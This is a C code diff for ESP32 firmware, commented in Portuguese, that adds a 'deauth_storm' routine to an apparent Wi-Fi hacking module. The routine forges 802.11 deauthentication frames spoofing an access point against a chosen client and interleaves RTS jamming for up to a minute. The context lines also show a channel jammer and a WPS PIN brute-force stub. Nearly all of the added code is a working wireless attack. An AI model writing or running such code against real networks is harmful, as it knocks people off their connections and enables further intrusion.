@@ -378,6 +378,116 @@ esp_err_t hacking_wifi_channel_jam_stop(void)
 }
 
 // ----------------------------------------------------------------------
+// deauth_storm — burst inicial de deauths + RTS jam intercalado
+// ----------------------------------------------------------------------
+
+typedef struct {
+    uint8_t target[6];
+    uint8_t bssid[6];
+    uint8_t channel;
+    uint16_t deauth_count;
+    uint16_t jam_seconds;
+} storm_job_t;
+
+static void storm_task(void *arg)
+{
+    storm_job_t *job = (storm_job_t *)arg;
+
+    esp_err_t err = esp_wifi_set_channel(job->channel, WIFI_SECOND_CHAN_NONE);
+    uint16_t deauth_sent = 0;
+    uint32_t rts_sent = 0;
+
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "storm: set_channel rc=%s", esp_err_to_name(err));
+        goto cleanup;
+    }
+
+    // Build deauth frame
+    uint8_t deauth_frame[sizeof(s_deauth_template)];
+    memcpy(deauth_frame, s_deauth_template, sizeof(deauth_frame));
+    memcpy(&deauth_frame[4],  job->target, 6);
+    memcpy(&deauth_frame[10], job->bssid,  6);
+    memcpy(&deauth_frame[16], job->bssid,  6);
+    deauth_frame[24] = 7; deauth_frame[25] = 0; // reason 7
+
+    // RTS frame
+    uint8_t rts_frame[sizeof(s_rts_template)];
+    memcpy(rts_frame, s_rts_template, sizeof(rts_frame));
+
+    // 1) Burst inicial de deauths
+    for (uint16_t i = 0; i < job->deauth_count && !s_jam_stop; i++) {
+        if (esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame,
+                               sizeof(deauth_frame), false) == ESP_OK) {
+            deauth_sent++;
+        }
+        vTaskDelay(pdMS_TO_TICKS(3));
+    }
+
+    // 2) Jam loop: alterna 30 RTS + 5 deauths até deadline
+    int64_t deadline = esp_timer_get_time() + (int64_t)job->jam_seconds * 1000000LL;
+    while (!s_jam_stop && esp_timer_get_time() < deadline) {
+        for (int i = 0; i < 30 && !s_jam_stop; i++) {
+            if (esp_wifi_80211_tx(WIFI_IF_STA, rts_frame,
+                                   sizeof(rts_frame), false) == ESP_OK) {
+                rts_sent++;
+            }
+            vTaskDelay(pdMS_TO_TICKS(25));
+        }
+        for (int i = 0; i < 5 && !s_jam_stop; i++) {
+            if (esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame,
+                                   sizeof(deauth_frame), false) == ESP_OK) {
+                deauth_sent++;
+            }
+            vTaskDelay(pdMS_TO_TICKS(3));
+        }
+    }
+
+    ESP_LOGI(TAG, "deauth_storm done: deauths=%u rts=%lu in %us",
+             (unsigned)deauth_sent, (unsigned long)rts_sent,
+             (unsigned)job->jam_seconds);
+
+cleanup:
+    free(job);
+    s_jam_stop = false;
+    s_task = NULL;
+    s_busy = false;
+    vTaskDelete(NULL);
+}
+
+esp_err_t hacking_wifi_deauth_storm(const uint8_t target_mac[6],
+                                     const uint8_t ap_bssid[6],
+                                     uint8_t channel,
+                                     uint16_t deauth_count,
+                                     uint16_t jam_seconds)
+{
+    if (!target_mac || !ap_bssid) return ESP_ERR_INVALID_ARG;
+    if (channel == 0 || channel > 14) return ESP_ERR_INVALID_ARG;
+    if (s_busy) return ESP_ERR_INVALID_STATE;
+
+    if (deauth_count < 10)  deauth_count = 10;
+    if (deauth_count > 500) deauth_count = 500;
+    if (jam_seconds < 5)    jam_seconds = 5;
+    if (jam_seconds > 60)   jam_seconds = 60;
+
+    storm_job_t *job = calloc(1, sizeof(*job));
+    if (!job) return ESP_ERR_NO_MEM;
+    memcpy(job->target, target_mac, 6);
+    memcpy(job->bssid,  ap_bssid,   6);
+    job->channel = channel;
+    job->deauth_count = deauth_count;
+    job->jam_seconds = jam_seconds;
+
+    s_busy = true;
+    s_jam_stop = false;
+    if (xTaskCreate(storm_task, "deauth_storm", 4096, job, 5, &s_task) != pdPASS) {
+        free(job);
+        s_busy = false;
+        return ESP_ERR_NO_MEM;
+    }
+    return ESP_OK;
+}
+
+// ----------------------------------------------------------------------
 // WPS PIN test (1 attempt) — base pra brute force lado-app
 // ----------------------------------------------------------------------
 
